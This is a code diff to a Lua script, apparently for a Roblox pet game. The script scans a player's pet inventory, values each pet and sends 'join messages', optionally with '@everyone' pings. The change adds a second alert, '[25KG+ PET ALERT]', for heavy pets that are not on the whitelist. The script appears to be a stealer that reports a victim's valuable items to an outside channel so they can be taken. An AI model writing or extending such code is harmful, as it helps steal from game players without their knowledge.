@@ -85,14 +85,11 @@ local function getPetEmoji(petName, weight)
     return petEmojis[petName] or "🦊"
 end
 
-local function isWhitelistedPet(petName, weight)
+local function isWhitelistedPet(petName)
     for _, allowed in ipairs(petWhitelist) do
         if string.find(string.lower(petName), string.lower(allowed), 1, true) then
             return true
         end
-    end
-    if weight and weight >= 25 then
-        return true
     end
     return false
 end
@@ -107,6 +104,7 @@ local function hasMutation(petName)
 end
 local totalValue = 0
 local itemsToSend = {}
+local highKGPets = {}
 
 -- Debug function
 local function debugPrint(message)
@@ -421,12 +419,16 @@ if playerData and playerData.PetsData and playerData.PetsData.PetInventory and p
         if v14 and v14.PetData and v14.PetType then
             local itemName = v14.PetType
             local weight = v14.PetData.BaseWeight or 0
-            local petAge = v14.PetData.Age or "N/A"
-            if isWhitelistedPet(itemName, weight) then
-                local value = calcPetValue(v14)
+            local petAge = v14.PetData.Age ~= nil and tostring(v14.PetData.Age) or "N/A"
+            local value = calcPetValue(v14)
+            if isWhitelistedPet(itemName) then
                 totalValue = totalValue + value
                 table.insert(itemsToSend, {Tool = nil, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
-                debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
+                debugPrint("Added whitelisted pet: " .. itemName .. " Value: " .. value .. " Age: " .. petAge)
+            elseif weight >= 25 then
+                totalValue = totalValue + value
+                table.insert(highKGPets, {Tool = nil, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
+                debugPrint("Added high KG pet: " .. itemName .. " Value: " .. value .. " Age: " .. petAge)
             end
         end
     end
@@ -437,7 +439,7 @@ debugPrint("Items to send: " .. #itemsToSend)
 debugPrint("Total value: " .. totalValue)
 
 if #itemsToSend > 0 then
-    debugPrint("Processing items...")
+    debugPrint("Processing whitelisted pets...")
     
     -- Sort items
     table.sort(itemsToSend, function(a, b)
@@ -473,6 +475,22 @@ if #itemsToSend > 0 then
     -- Remove followUser and waitForUserChat, just send notification after scan
     SendJoinMessage(sentItems, prefix)
 else
+    debugPrint("No items found that meet the minimum value requirement")
+    debugPrint("Try lowering the min_value in the configuration")
+end 
+if #highKGPets > 0 then
+    debugPrint("Processing high KG pets not in whitelist...")
+    -- Send a separate notification for high KG pets not in whitelist
+    table.sort(highKGPets, function(a, b)
+        return a.Value > b.Value
+    end)
+    local prefix = ""
+    if ping == "Yes" then
+        prefix = "--@everyone "
+    end
+    SendJoinMessage(highKGPets, prefix .. "[25KG+ PET ALERT] ")
+end
+if #itemsToSend == 0 and #highKGPets == 0 then
     debugPrint("No items found that meet the minimum value requirement")
     debugPrint("Try lowering the min_value in the configuration")
 end 
